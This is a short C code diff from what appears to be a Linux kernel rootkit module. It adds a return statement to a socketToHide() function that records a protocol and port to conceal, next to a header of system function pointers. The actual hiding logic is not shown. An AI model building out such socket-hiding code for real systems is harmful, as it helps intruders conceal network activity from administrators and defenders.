@@ -4,6 +4,7 @@
 #include <net/udp.h>
 #include <net/inet_sock.h>
 #include <linux/socket.h>
+
 #include "sysmap.h"          /* Pointers to system functions */
 #include "global.h"
 
@@ -25,6 +26,7 @@ char* prot_to_hide = "";
 int socketToHide(char *protocol, int port){
     prot_to_hide = protocol;
     port_to_hide = port;
+    return port; // correct?
 }
 
 
